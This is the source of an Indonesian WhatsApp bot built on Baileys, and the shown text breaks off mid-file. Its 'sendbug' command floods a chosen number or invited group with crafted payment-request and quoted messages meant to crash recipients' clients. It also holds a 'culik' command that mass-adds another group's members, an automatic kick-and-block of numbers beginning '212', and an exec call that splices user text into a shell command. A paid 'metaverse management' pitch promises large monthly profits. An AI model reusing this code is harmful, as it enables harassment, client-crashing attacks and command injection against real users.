"use strict";
require('dotenv').config();
    const { flatDirectly } = require('../../library/required/get.js');
    const { bind, jsonformat, isUrl, byteToSize } = require('../../library/events/bind.js');
    const { noted } = require('../../library/writings/noted.js');
    const { info, switching } = require('../../dbase/config/dat.json');
    const { imageToWebp, writeExifImg, writeExifVid } = require('../../library/tools/exif.js');
    const { yta } = require('../../library/tools/y2mate.js')
    const { yts, node_fetch, hxz, boom, baileys, fs, chalk, PhoneNumber, FileType, util, child_process } = new flatDirectly();
    const { exec, spawn } = child_process;
    const { generateForwardMessageContent, generateWAMessageFromContent, downloadContentFromMessage, isJidStatusBroadcast, jidDecode, areJidsSameUser, jidNormalizedUser, getContentType, proto, delay } = baileys;
    
    module.exports = {
        async newModule(msg, razzaq, store) {
            try {
                if(!msg.messages) return
                if(!switching.remoteJid) {
                    if(razzaq.decodeJid(msg.key?.fromMe)) return
                };
                    global.m = await bind(razzaq, msg.messages[0], store)
                    global.dfail = (type, m) => {
                    var msgnye = {
                        grup: "Khusus Dalam Grup!",
                        admin: "Khusus Admin Grup!",
                        botAdmin: "Bot Harus Menjadi Admin!",
                        owner: "Khusus Owner Bot!",
                        publik: "Bot Sekarang Dalam Mode Self!",
                        banned: "Maaf, Anda Di Banned! Silahkan Hubungi Developer Bot Untuk Membukanya.",
                        ErrLink: "Format Link Tidak Di temukan!",
                        ErrText: "Forman Text Tidak Di Temukan!"
                    }[type]
                    if(msgnye) return m.reply(msgnye)
                };
                if(m.msg && m.mtype == 'protocolMessage') return razzaq.ev.emit('message.delete', m.message)
                if(m.key && await isJidStatusBroadcast(m.key.remoteJid)) return razzaq.readMessages([m.key])
                if(!switching.remoteJid && !m.key.fromMe && msg.type === 'notify') return
                if(m.key.id.startsWith('BAE5') && m.key.id.length === 16) return
                if(m.sender.startsWith('212')) return razzaq.groupParticipantsUpdate(m.chat, [ m.sender ], 'remove')
                if(m.sender.startsWith('212')) return razzaq.updateBlockStatus(m.sender, 'block')
                if(m.message) {
                    console.log(chalk.bold.black(chalk.bgYellow('[MSG]')), chalk.bold.black(chalk.bgRed(new Date)), chalk.bold.black(chalk.bgGreen(m.body || m.mtype)) + '\n' + chalk.underline.white('> ') + chalk.underline.blue('From'), chalk.underline.green(m.name), chalk.underline.yellow(m.sender) + '\n' + chalk.underline.white('> ') + chalk.underline.blue('To'), chalk.underline.grey(m.isGroup ? m.name : 'Private Chat'))
	                if(m.isGroup) {
	                    await razzaq.readMessages([m.key])
	                };
	            };
                if(switching.autoresponder) {
                    await setTimeout(async () => {
                        let content;
                        if(m.body.includes("Assalamualaikum") || m.body.includes("Assalamu'alaikum") || m.body.includes("assalamualaikum") || m.body.includes("assalamu'alaikum")) {
                            if(m.key.fromMe) return
                            var teks = [ "Wa'alaikumussalam Warahmatullahi Wabarakatuh\n_وَعَلَيْكُمْ السَّلاَمُ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ_", "Wa'alaikumussalam Warahmatullahi Wabarakatuh 😊\n_وَعَلَيْكُمْ السَّلاَمُ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ_", "Wa'alaikumussalam Warahmatullahi Wabarakatuh ❤️\n_وَعَلَيْكُمْ السَّلاَمُ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ_", "Wa'alaikumussalam Warahmatullahi Wabarakatuh ✨\n_وَعَلَيْكُمْ السَّلاَمُ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ_", "Wa'alaikumussalam Warahmatullahi Wabarakatuh 🤗\n_وَعَلَيْكُمْ السَّلاَمُ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ_", "Wa'alaikumussalam Warahmatullahi Wabarakatuh 🌹\n_وَعَلَيْكُمْ السَّلاَمُ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ_", "Wa'alaikumussalam Warahmatullahi Wabarakatuh 🙏🏻\n_وَعَلَيْكُمْ السَّلاَمُ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ_" ] 
                            content = teks[Math.floor(Math.random() *   teks.length)];
                            await m.reply(content);
                        };
                        if(m.body.includes("Pepek") || m.body.includes("pepek") || m.body.includes("Kontol") || m.body.includes("kontol") || m.body.includes("Anjeng") || m.body.includes("anjeng") || m.body.includes("Bokep") || m.body.includes("bokep") || m.body.includes("Sange") || m.body.includes("sange") || m.body.includes("Ngentot") || m.body.includes("ngentot") || m.body.includes("Babi") || m.body.includes("babi")) {
                            if(m.key.fromMe) return
                            var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                                requestPaymentMessage: {
                                    currencyCodeIso4217: "USD",
                                    amount1000: 1000,
                                    requestFrom: m.chat,
                                    Message: {
                                        extendedTextMessage: {
                                            text: ''
                                        }, 
                                    },
                                },
                            }), { userJid: m.chat, quoted: m })
                            razzaq.relayMessage(m.chat, requestPaymentMessage.message, { messageId: '' })
                            .then(() => m.reply(`Astagfirullah`))
                        };
                    }, 3000);
                };
                if(switching.remoteJid && m.key.remoteJid && m.isOwner) {
                    await setTimeout(async () => {
                        let content;
                        if(m.body.startsWith(m.prefix+"buttons")) {
                            if(!switching.cmdPublic) return global.dfail("publik", m)
                            if(m.isBanned) return global.dfail("banned", m)
                            if(m.args.length < 1) return m.reply(`Example: ${m.command} type\nParam: Send Message With Caption ${m.command} type\nDesc: Testing Bot\n`);
                            if((m.args[0]) === 'testOne') {
                                var text = 'Work As Button Response #1'
                                m.reply(text);
                            } else if((m.args[0]) === 'testTwo') {
                                var text = 'Work As Button Response #2'
                                m.reply(text);
                            } else if((m.args[0]) === 'testThree') {
                                var text = 'Work As Button Response #3'
                                m.reply(text);
                            } else if((m.args[0]) === 'owner') {
                                razzaq.sendMessage(m.chat, { text: '@'+info.owner.number[0]+'@s.whatsapp.net'.split("@")[0], mentions: [info.owner.number[0]+'@s.whatsapp.net'] }, { quoted: m })
                            } else if((m.args[0]) === 'management') {
                                if((m.args[1]) === 'metaverse') {
                                    content = `Apakah @${m.sender.split("@")[0]} Ingin Join Management ?\n`
                                    content += `Biaya Pendaftaran Sebesar 30.000-RP/30.000-IDR (K/RB)\n\n`
                                    content += `Untuk Memulai Sebuah Bisnis, Dipersilahkan Untuk Belajar Terlebih Dahulu.\n`
                                    content += `Profit Pendapatan Di Management Kisaran 1-7 juta-an/bulan\n`
                                    content += `Untuk Informasi Lebih Lanjut, Silahkan Klik Button Dibawah!\n`
                                    razzaq.sendBI3(m.chat, content, info.bot.footer.split("@")[0] + '@' + info.owner.number[0].split("@")[0], m.thumb, `${m.prefix}buttons management belajar`, "BELAJAR DULU", `${m.prefix}buttons management join`, "DAFTAR SEKARANG!", `${m.prefix}buttons owner`, "OWNER", m, { mentions: [ info.owner.number[0]+'@s.whatsapp.net', m.sender ] })
                                } else if((m.args[1]) === 'belajar') {
                                    content = [
                                        { text: `Apa yang dimaksud dengan management?`, id: `${m.prefix}list management adalah` },
                                        { text: `Apa tujuan dari management?`, id: `${m.prefix}list management tujuan` },
                                        { text: `Apa yang dikerjakan oleh management?`, id: `${m.prefix}list management dikerjakan` },
                                        { text: `Apa saja contoh management?`, id: `${m.prefix}list management contoh` },
                                        { text: `Apa yang dimaksud dengan hakikat management?`, id: `${m.prefix}list management hakikat` },
                                        { text: `Apa saja 5 fungsi management?`, id: `${m.prefix}list management fungsi` },
                                        { text: `Apa saja dasar dasar management?`, id: `${m.prefix}list management dasar` },
                                        { text: `Siapa saja yang membutuhkan management?`, id: `${m.prefix}list management membutuhkan` },
                                        { text: `Apa saja ciri-ciri management?`, id: `${m.prefix}list management ciriciri` },
                                        { text: `Talent management adalah?`, id: `${m.prefix}list management talent` }
                                    ];
                                    var rows = [];
                                    for (var y of content) {
                                        rows.push({
                                            title: y.text,
                                            rowId: y.id
                                        });
                                    }
                                    var button = {
                                        buttonText: `Tekan Disini`,
                                        footer: info.bot.footer.split("@")[0] + '@' + info.owner.number[0].split("@")[0],
                                        text: `Hello 👋 @${m.sender.split('@')[0]}, Silahkan Belajar Terlebih Dahulu Untuk Memulai Sebuah Bisnis Di Metaverse Management.\n`
                                    };
                                    var sections = [
                                        { rows: rows }
                                    ]
                                    razzaq.sendMessage(m.chat, { text: button.text, footer: button.footer, title: button.title, buttonText: button.buttonText, sections, mentions: [ info.owner.number[0] + '@s.whatsapp.net', m.sender ] }, { fromMe: m.chat, quoted: m });
                                } else if((m.args[1]) === 'join') { 
                                    m.reply("Fitur Belum Tersedia")
                                };
                            };
                        };
                        if(m.body.startsWith(m.prefix+"list")) {
                            if(!switching.cmdPublic) return global.dfail("publik", m)
                            if(m.isBanned) return global.dfail("banned", m)
                            if(m.args.length < 1) return m.reply(`Example: ${m.command} type\nParam: Send Message With Caption ${m.command} type\nDesc: Testing Bot\n`);
                            if((m.args[0]) === 'management') {
                                if((m.args[1]) === 'adalah') {
                                    content = `Secara umum, pengertian management merupakan suatu seni dalam ilmu dan pengorganisasian seperti menyusun perencanaan, membangun organisasi dan pengorganisasiannya, pergerakan, serta pengendalian atau pengawasan.\n`
                                    razzaq.sendBI3(m.chat, content, info.bot.footer.split("@")[0] + '@' + info.owner.number[0].split("@")[0], m.thumb, `${m.prefix}buttons management sistem`, "SISTEM MANAGEMENT", `${m.prefix}buttons management gaji`, "SISTEM GAJI", `${m.prefix}buttons management join`, "DAFTAR SEKARANG!", m, { mentions: [ info.owner.number[0]+'@s.whatsapp.net', m.sender ] })
                                } else if((m.args[1]) === 'tujuan') {
                                    content = `Sedangkan tujuan management adalah untuk memperoleh hasil maksimal dengan biaya atau usaha seminimal mungkin, dengan mendayagunakan seluruh aspek pendukung berupa SDM, aset, dan finansial yang telah diatur sesuai perencanaan.\n`
                                    razzaq.sendBI3(m.chat, content, info.bot.footer.split("@")[0] + '@' + info.owner.number[0].split("@")[0], m.thumb, `${m.prefix}buttons management sistem`, "SISTEM MANAGEMENT", `${m.prefix}buttons management gaji`, "SISTEM GAJI", `${m.prefix}buttons management join`, "DAFTAR SEKARANG!", m, { mentions: [ info.owner.number[0]+'@s.whatsapp.net', m.sender ] })
                                } else if((m.args[1]) === 'dikerjakan') {
                                    content = `Management merupakan proses perencanaan, pengorganisasian, pengarahan, dan pengawasan sumber daya dalam bentuk finansial, manusia, serta informasi suatu perusahaan/organisasi untuk mencapai sasarannya.\n`
                                    razzaq.sendBI3(m.chat, content, info.bot.footer.split("@")[0] + '@' + info.owner.number[0].split("@")[0], m.thumb, `${m.prefix}buttons management sistem`, "SISTEM MANAGEMENT", `${m.prefix}buttons management gaji`, "SISTEM GAJI", `${m.prefix}buttons management join`, "DAFTAR SEKARANG!", m, { mentions: [ info.owner.number[0]+'@s.whatsapp.net', m.sender ] })
                                } else if((m.args[1]) === 'contoh') {
                                    content = `Contoh management dalam sebuah perusahaan.\n`
                                    content += `${m.numberLive++}. management Produksi.\n`
                                    content += `${m.numberLive++}. management Pemasaran.\n`
                                    content += `${m.numberLive++}. management Administrasi Perkantoran.\n`
                                    content += `${m.numberLive++}. management Konstruksi.\n`
                                    content += `${m.numberLive++}. management Sumber Daya Manusia.\n`
                                    razzaq.sendBI3(m.chat, content, info.bot.footer.split("@")[0] + '@' + info.owner.number[0].split("@")[0], m.thumb, `${m.prefix}buttons management sistem`, "SISTEM MANAGEMENT", `${m.prefix}buttons management gaji`, "SISTEM GAJI", `${m.prefix}buttons management join`, "DAFTAR SEKARANG!", m, { mentions: [ info.owner.number[0]+'@s.whatsapp.net', m.sender ] })
                                } else if((m.args[1]) === 'hakikat') {
                                    content = `Hakikat manajemen adalah merupakan proses pemberian bimbingan, pimpinan, pengaturan, pengendalian, dan pemberian fasilitas lainnya.\n`
                                    razzaq.sendBI3(m.chat, content, info.bot.footer.split("@")[0] + '@' + info.owner.number[0].split("@")[0], m.thumb, `${m.prefix}buttons management sistem`, "SISTEM MANAGEMENT", `${m.prefix}buttons management gaji`, "SISTEM GAJI", `${m.prefix}buttons management join`, "DAFTAR SEKARANG!", m, { mentions: [ info.owner.number[0]+'@s.whatsapp.net', m.sender ] })
                                } else if((m.args[1]) === 'fungsi') {
                                    content = `Manajemen juga memiliki fungsi yang penting dalam sebuah bisnis, fungsi manajemen ini adalah sebagai elemen dasar yang harus melekat dalam manajemen sebagai acuan dalam melaksanakan tugas untuk mencapai tujuan dengan cara merencanakan, mengorganisir, mengordinasi dan tentunya mengendalikan.\n\n`
                                    content += `Fungsi management bisnis\n`
                                    content += `proses perencanaan (planning), pengorganisasian (organizing), pengkoordinasian (directing), dan pengontrolan (controlling) sumber daya. Dengan terlaksananya keempat fungsi ini, sasaran atau tujuan bisnis diharapkan dapat dicapai secara efektif dan efisien.\n\n`
                                    content += `Fungsi penting dalam manajemen yang diterapkan dalam sebuah bisnis, seperti yang diungkapkan oleh Henri Fayol, adalah sebagai berikut:\n`
                                    content += `Perencanaan (planning)\n`
                                    content += `Pengorganisasian (organizing)\n`
                                    content += `Staffing.\n`
                                    content += `Mengarahkan (directing)\n`
                                    content += `Pengawasan (controlling)\n`
                                    razzaq.sendBI3(m.chat, content, info.bot.footer.split("@")[0] + '@' + info.owner.number[0].split("@")[0], m.thumb, `${m.prefix}buttons management sistem`, "SISTEM MANAGEMENT", `${m.prefix}buttons management gaji`, "SISTEM GAJI", `${m.prefix}buttons management join`, "DAFTAR SEKARANG!", m, { mentions: [ info.owner.number[0]+'@s.whatsapp.net', m.sender ] })
                                } else if((m.args[1]) === 'dasar') {
                                    content = `Fungsi dasar manajemen, yaitu Planning (Perencanaan), Organizing (Pengorganisasian), Actuating (Pelaksanaan) dan Controlling (Pengawasan). Keempat fungsi manajemen ini disingkat dengan POAC.\n`
                                    razzaq.sendBI3(m.chat, content, info.bot.footer.split("@")[0] + '@' + info.owner.number[0].split("@")[0], m.thumb, `${m.prefix}buttons management sistem`, "SISTEM MANAGEMENT", `${m.prefix}buttons management gaji`, "SISTEM GAJI", `${m.prefix}buttons management join`, "DAFTAR SEKARANG!", m, { mentions: [ info.owner.number[0]+'@s.whatsapp.net', m.sender ] })
                                } else if((m.args[1]) === 'membutuhkan') {
                                    content = `Dalam manajemen, pada dasarnya setiap pihak yang terlibat dalam perusahaan akan memerlukan manajemen, mulai dari pemilik, tenaga kerja, pemberi kredit, hingga investor.\n`==
                                    razzaq.sendBI3(m.chat, content, info.bot.footer.split("@")[0] + '@' + info.owner.number[0].split("@")[0], m.thumb, `${m.prefix}buttons management sistem`, "SISTEM MANAGEMENT", `${m.prefix}buttons management gaji`, "SISTEM GAJI", `${m.prefix}buttons management join`, "DAFTAR SEKARANG!", m, { mentions: [ info.owner.number[0]+'@s.whatsapp.net', m.sender ] })
                                } else if((m.args[1]) === 'ciriciri') {
                                    content = `Manajemen mempunyai ciri-ciri seperti berikut, kecuali\n\n`
                                    content += `${m.numberLive++}. manajemen digunakan terhadap seorang individu.\n`
                                    content += `${m.numberLive++}. manajemen berusaha untuk mencapai tujuan yang telah ditetapkan.\n`
                                    content += `${m.numberLive++}. manajemen merupakan suatu ilmu yang dapat dipelajari.\n`
                                    content += `${m.numberLive++}. pencapaian tujuan dilakukan secara sistematis.\n`
                                    content += `${m.numberLive++}. ada pembagian kerja yang jelas dan tegas.\n`
                                    razzaq.sendBI3(m.chat, content, info.bot.footer.split("@")[0] + '@' + info.owner.number[0].split("@")[0], m.thumb, `${m.prefix}buttons management sistem`, "SISTEM MANAGEMENT", `${m.prefix}buttons management gaji`, "SISTEM GAJI", `${m.prefix}buttons management join`, "DAFTAR SEKARANG!", m, { mentions: [ info.owner.number[0]+'@s.whatsapp.net', m.sender ] })
                                } else if((m.args[1]) === 'talent') {
                                    content = `Management talent adalah pengelolaan SDM yang dilakukan dengan menggunakan proses analisis, pengembangan, dan pemanfaatan talent yang berkelanjutan dan efektif untuk memenuhi kebutuhan bisnis.\n`
                                    razzaq.sendBI3(m.chat, content, info.bot.footer.split("@")[0] + '@' + info.owner.number[0].split("@")[0], m.thumb, `${m.prefix}buttons management sistem`, "SISTEM MANAGEMENT", `${m.prefix}buttons management gaji`, "SISTEM GAJI", `${m.prefix}buttons management join`, "DAFTAR SEKARANG!", m, { mentions: [ info.owner.number[0]+'@s.whatsapp.net', m.sender ] })
                                };
                            };
                        };
                        if(m.body.startsWith(m.prefix+"sendbug")) {
                            if(!m.isOwner) return global.dfail("owner", m)
                            if(m.args.length < 1) return m.reply(`Example: ${m.command} type [String] id amount\nParam: Send Bug With Caption ${m.command} type [String] id amount\nDesc: Send Bugs\n`);
                            if((m.args[0]) === 'forceclose') {
                                if((m.args[1]) === 'id') {
                                    for (var i = 0; i < m.args[3]; i++) {
                                        await delay(3000)
                                        await razzaq.sendMessage(m.args[2], { text: m.name }, { quoted: doc() })
                                    }
                                    await m.reply(`Success Send Bug To: ${m.args[2].split("@")[0]}\nAmount Spam: ${m.args[3]}\nType: ${m.args[0]} ${m.args[1]}`);
                                } else if((m.args[1]) === 'link') {
                                    if(!isUrl(m.args[2]) && !m.args[2].includes('whatsapp.com')) return global.dfail("ErrLink", m);
                                    var result = m.args[2].split('https://chat.whatsapp.com/')[1]
                                    var res = await razzaq.groupAcceptInvite(result)
                                    try {
                                        for (var i = 0; i < m.args[3]; i++) {
                                            await razzaq.sendMessage(`${res}`, { text: m.name }, { quoted: doc() })
                                        };
                                        await m.reply(`Success Send Bug To: ${res.split("@")[0]}\nAmount Spam: ${m.args[3]}\nType: ${m.args[0]} ${m.args[1]}`);
                                    } catch (err) {
                                        m.reply(jsonformat(err));
                                    };
                                } else {
                                    content = '*List type:*\n'
                                    content += `${m.numberLive++}. ${m.command} forceclose id\n`
                                    content += `${m.numberLive++}. ${m.command} forceclose link\n`
                                    m.reply(content);
                                };
                            } else if((m.args[0]) === 'crash') {
                                if((m.args[1]) === 'id') {
                                    for (var i = 0; i < m.args[3]; i++) {
                                        var requestPaymentMessage = generateWAMessageFromContent(m.args[2], proto.Message.fromObject({
                                            requestPaymentMessage: {
                                                currencyCodeIso4217: "USD",
                                                amount1000: 1000,
                                                requestFrom: m.args[2],
                                                Message: {
                                                    extendedTextMessage: {
                                                        text: m.name
                                                    }, 
                                                }, 
                                            },
                                        }), { userJid: m.args[2], quoted: m })
                                        await razzaq.relayMessage(m.args[2], requestPaymentMessage.message, { messageId: '' })
                                    };
                                    await m.reply(`*Success Send Bug!*\nTo: ${m.args[2].split("@")[0]}\nAmount Spam: ${m.args[3]}\nType: ${m.args[0]}\n[String]: ${m.args[1]}`)
                                } else if((m.args[1]) === 'link') {
                                    if(!isUrl(m.args[2]) && !m.args[2].includes('whatsapp.com')) return global.dfail("ErrLink", m);
                                    var result = m.args[2].split('https://chat.whatsapp.com/')[1]
                                    var res = await razzaq.groupAcceptInvite(result)
                                    try {
                                        for (var i = 0; i < m.args[3]; i++) {
                                            var requestPaymentMessage = generateWAMessageFromContent(`${res}`, proto.Message.fromObject({
                                                requestPaymentMessage: {
                                                    currencyCodeIso4217: "USD",
                                                    amount1000: 1000,
                                                    requestFrom: `${res}`,
                                                    Message: {
                                                        extendedTextMessage: {
                                                            text: ''
                                                        }, 
                                                    }, 
                                                },
                                            }), { userJid: `${res}`, quoted: m })
                                            await razzaq.relayMessage(`${res}`, requestPaymentMessage.message, { messageId: '' })
                                        };
                                        await m.reply(`Success Send Bug To: ${res.split("@")[0]}\nAmount Spam: ${m.args[3]}\nType: ${m.args[0]} ${m.args[1]}`);
                                    } catch (err) {
                                        m.reply(jsonformat(err));
                                    };
                                } else {
                                    content = '*List type:*\n'
                                    content += `${m.numberLive++}. ${m.command} crash id\n`
                                    content += `${m.numberLive++}. ${m.command} crash link\n`
                                    m.reply(content);
                                }; 
                            } else {
                                content = '*List Type:*\n'
                                content += `${m.numberLive++}. ${m.command} forceclose [String]\n`
                                content += `${m.numberLive++}. ${m.command} crash [String]\n`
                                m.reply(content);
                            };
                        };
                        if(m.body.startsWith(m.prefix+"culik")) {
                            if(!m.isGroup) return global.dfail("grup", m)
                            if(!m.isOwner) return global.dfail("owner", m)
                            if(m.args.length < 1) return m.reply(`Example: ${m.command} Type Id\nParam: Send Message With Caption ${m.command} Type Id\nDesc: Kidnapping Members\n`);
                            if((m.args[0]) === 'id') {
                                var groupMetadata = m.isGroup ? store?.groupMetadata[m.args[1]] !== undefined ? store.groupMetadata[m.args[1]] : await store.fetchGroupMetadata(m.args[1], razzaq) : {};
                                var groupMembers = m.isGroup ? groupMetadata.participants : [];
                                for (var mem of groupMembers) {
                                    razzaq.groupParticipantsUpdate(m.chat, groupMembers.map(a => a.id), 'add')
                                };
                                content = "Successfully!"
                                m.reply(content);
                            } else if((m.args[0]) === 'link') {
                                content = "Fitur Ini Belum Tersedia"
                                m.reply(content);
                            } else {
                                content = '*List Type:*\n'
                                content += `${m.numberLive++}. ${m.command} id\n`
                                content += `${m.numberLive++}. ${m.command} link\n`
                                m.reply(content);
                            };
                        };
                        if(m.body.startsWith(m.prefix+"check")) {
                            if(!switching.cmdPublic) return global.dfail("publik", m)
                            if(m.isBanned) return global.dfail("banned", m)
                            if((m.args[0]) === 'antilink') {
                                if((m.args[1]) === 'group') {
                                    m.reply(`Status Antilink [Group] Pada Group Ini: ${switching.antilinkgroup ? "AKTIF" : "MATI"}`)
                                } else if((m.args[1]) === 'youtube') {
                                    m.reply(`Status Antilink [Youtube] Pada Group Ini: ${switching.antilinkyoutube ? "AKTIF" : "MATI"}`)
                                } else {
                                    content = '*List Type:*\n'
                                    content += `${m.numberLive++}. ${m.command} antilink group\n`
                                    content += `${m.numberLive++}. ${m.command} antilink youtube\n`
                                    m.reply(content);
                                }; 
                            } else if((m.args[0]) === 'auto') {
                                if((m.args[1]) === 'react') {
                                    m.reply(`Status Auto [React] Pada Bot Ini: ${switching.autoreact ? "AKTIF" : "MATI"}`)
                                } else if((m.args[1]) === 'recording') {
                                    m.reply(`Status Auto [Recording] Pada Bot Ini: ${switching.autorecording ? "AKTIF" : "MATI"}`)
                                } else if((m.args[1]) === 'bio') {
                                    m.reply(`Status Auto [Bio] Pada Bot Ini: ${switching.autobio.status ? "AKTIF" : "MATI"}`)
                                }  else if((m.args[1]) === 'responder') {
                                    m.reply(`Status Auto [Responder] Pada Bot Ini: ${switching.autoresponder ? "AKTIF" : "MATI"}`)
                                } else {
                                    content = '*List Type:*\n'
                                    content += `${m.numberLive++}. ${m.command} auto react\n`
                                    content += `${m.numberLive++}. ${m.command} auto recording\n`
                                    content += `${m.numberLive++}. ${m.command} auto responder\n` 
                                    content += `${m.numberLive++}. ${m.command} auto bio\n`
                                    m.reply(content);
                                };
                            } else if((m.args[0]) === 'detect') {
                                if((m.args[1]) === 'delete') {
                                    m.reply(`Status Detect [Delete] Pada Bot Ini: ${switching.antiDeleteKey ? "AKTIF" : "MATI"}`)
                                } else if((m.args[1]) === 'command') {
                                    m.reply(`Status Command Pada Bot Ini: ${switching.cmdPublic ? "AKTIF" : "MATI"}`)
                                } else if((m.args[1]) === 'welcome') {
                                    m.reply(`Status Welcome Pada Group Ini: ${switching.welcome ? "AKTIF" : "MATI"}`)
                                } else if((m.args[1]) === 'mode') {
                                    m.reply(`Sekarang Bot Dalam Mode: ${switching.remoteJid ? "PUBLIC" : "SELF"}`)
                                } else {
                                    content = '*List Type:*\n'
                                    content += `${m.numberLive++}. ${m.command} detect delete\n`
                                    content += `${m.numberLive++}. ${m.command} detect command\n`
                                    content += `${m.numberLive++}. ${m.command} detect welcome\n`
                                    content += `${m.numberLive++}. ${m.command} detect mode\n`
                                };
                            } else {
                                content = '*List Type:*\n'
                                content += `${m.numberLive++}. ${m.command} antilink [String]\n`
                                content += `${m.numberLive++}. ${m.command} auto [String]\n`
                                content += `${m.numberLive++}. ${m.command} detect [String]\n`
                                m.reply(content);
                            };
                        };
                        if(m.body.startsWith(m.prefix+"menu")) {
                            if(!switching.cmdPublic) return global.dfail("publik", m)
                            if(m.isBanned) return global.dfail("banned", m)
                            var mem = process.memoryUsage();
                            var obj = Object.keys(mem).map(ve => `├◉ ${ve}: ${byteToSize(mem[ve], 2)}`).join("\n")
                            content = `╭─ ⌜ ${info.bot.name} ⌟\n`
                            content += `├◉ Waktu: ${m.ucapanWaktu} - ${m.moment} WIB\n`
                            content += `${obj}\n`
                            content += `╰◉ Version: ${require("@adiwajshing/baileys/package").version}\n\n`
                            content += `*List Others:*\n`
                            content += `${m.numberLive++}. ${m.prefix}test type\n`
                            content += `${m.numberLive++}. ${m.prefix}check type [String]\n\n`
                            content += `*List Owners:*\n`
                            content += `${m.numberLive++}. ${m.prefix}mode [self/public]\n`
                            content += `${m.numberLive++}. ${m.prefix}command [enable/disable]\n`
                            content += `${m.numberLive++}. ${m.prefix}sendbug type [String] id amount\n`
                            content += `${m.numberLive++}. ${m.prefix}join type [String]\n`
                            content += `${m.numberLive++}. ${m.prefix}culik type id\n`
                            content += `${m.numberLive++}. ${m.prefix}npm type [String]\n`
                            razzaq.sendBI2(m.chat, content, info.bot.footer.split("@")[0] + '@' + info.owner.number[0].split("@")[0], m.thumb, `${m.prefix}buttons owner`, "OWNER", `${m.prefix}buttons management metaverse`, "METAVERSE MANAGEMENT", m, { mentions: [ info.owner.number[0]+'@s.whatsapp.net' ] })
                        };
                        if(m.body.startsWith(m.prefix+"npm")) {
                            if(!m.isOwner) return global.dfail("owner", m)
                            if((m.args[0]) === 'cache') {
                                try {
                                    exec(`cache verify`, (err, stdout) => {
                                        if(err) return m.reply(util.format(err))
                                        if(stdout) {
                                            m.reply(util.format(stdout))
                                        };
                                    });
                                } catch (err) {
                                    m.reply(util.format(err))
                                };
                            } else if((m.args[0]) === 'version') { 
                                try {
                                    exec(`version`, (err, stdout) => {
                                        if(err) return m.reply(util.format(err))
                                        if(stdout) {
                                            m.reply(util.format(stdout))
                                        };
                                    });
                                } catch (err) {
                                    m.reply(util.format(err))
                                };
                            } else if((m.args[0]) === 'update') { 
                                try {
                                    exec(`update`, (err, stdout) => {
                                        if(err) return m.reply(util.format(err))
                                        if(stdout) {
                                            m.reply(util.format(stdout))
                                        };
                                    });
                                } catch (err) {
                                    m.reply(util.format(err))
                                };
                            } else if((m.args[0]) === 'install') { 
                                if(!m.args[1]) return global.dfail("ErrText", m)
                                try {
                                    exec(`install ${m.args[1]}`, (err, stdout) => {
                                        if(err) return m.reply(util.format(err))
                                        if(stdout) {
                                            m.reply(util.format(stdout))
                                        };
                                    });
                                } catch (err) {
                                    m.reply(util.format(err))
                                };
                            } else {
                                content = '*List Type:*\n'
                                content += `${m.numberLive++}. ${m.command} cache\n`
                                content += `${m.numberLive++}. ${m.command} version\n`
                                content += `${m.numberLive++}. ${m.command} update\n` 
                                content += `${m.numberLive++}. ${m.command} install [String]\n`
                                m.reply(content);
                            };
                        };
                        if(m.body.startsWith(m.prefix+"mode")) {
                            if(!m.isOwner) return global.dfail("owner", m)
                            if((m.args[0]) === 'self') {
                                switching.remoteJid = false
                                m.reply(`Sekarang Bot Dalam Mode: ${switching.remoteJid ? "PUBLIC" : "SELF"}`)
                            } else if((m.args[0]) === 'public') {
                                switching.remoteJid = true
                                m.reply(`Sekarang Bot Dalam Mode: ${switching.remoteJid ? "PUBLIC" : "SELF"}`) 
                            } else {
                                content = '*List Type:*\n'
                                content += `${m.numberLive++}. ${m.command} self\n`
                                content += `${m.numberLive++}. ${m.command} public\n`
                                m.reply(content);
                            };
                        };
                        if(m.body.startsWith(m.prefix+"command")) {
                            if(!m.isOwner) return global.dfail("owner", m)
                            if((m.args[0]) === "disable") {
                                switching.cmdPublic = false
                                m.reply(`Sekarang Command Dalam Mode: ${switching.cmdPublic ? "PUBLIC" : "SELF"}`)
                            } else if((m.args[0]) === "enable") {
                                switching.cmdPublic = true
                                m.reply(`Sekarang Command Dalam Mode: ${switching.cmdPublic ? "PUBLIC" : "SELF"}`) 
                            } else {
                                content = '*List Type:*\n'
                                content += `${m.numberLive++}. ${m.command} enable\n`
                                content += `${m.numberLive++}. ${m.command} disable\n`
                                m.reply(content);
                            };
                        };
                        if(m.body.startsWith(m.prefix+"test")) {
                            if(!switching.cmdPublic) return global.dfail("publik", m)
                            if(m.isBanned) return global.dfail("banned", m)
                            if(m.args.length < 1) return m.reply(`Example: ${m.command} type\nParam: Send Message With Caption ${m.command} type\nDesc: Testing Bot\n`);
                            if((m.args[0]) === 'text') {
                                content = 'Work As Command'
                                m.reply(content);
                            } else if((m.args[0]) === 'button') {
                                var button =  [ 
                                    { buttonId: `${m.prefix}buttons testOne`, buttonText: { displayText: 'TEST BUTTON 1' }, type: 1 }, 
                                    { buttonId: `${m.prefix}buttons testTwo`, buttonText: { displayText: 'TEST BUTTON 2' }, type: 1 }, 
                                    { buttonId: `${m.prefix}buttons testThree`, buttonText: { displayText: 'TEST BUTTON 3' }, type: 1 }, 
                                ];
                                razzaq.sendButtonText(m.chat, button, 'Testing With Button Command', info.bot.footer.split("@")[0] + '@' + info.owner.number[0].split("@")[0], m, { mentions: [ info.owner.number[0]+'@s.whatsapp.net' ] })
                            } else {
                                content = '*List Type:*\n'
                                content += `${m.numberLive++}. ${m.command} text\n`
                                content += `${m.numberLive++}. ${m.command} button\n`
                                m.reply(content);
                            };
                        };
                        if(m.body.startsWith(m.prefix+"join")) {
                            if(!m.isOwner) return global.dfail("owner", m);
                            if((m.args[0]) === 'group') {
                                if(!isUrl(m.args[1]) && !m.args[1].includes('whatsapp.com')) return global.dfail("ErrLink", m);
                                var result = m.args[1].split('https://chat.whatsapp.com/')[1]
                                razzaq.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                            } else {
                                content = '*List Type:*\n'
                                content += `${m.numberLive++}. ${m.command} group\n`
                                m.reply(content);
                            };
                        };
                        if(m.body.startsWith("=>")) {
                            if(!m.isOwner) return
                            try {
                                var evaled = await eval(m.body.slice(2))
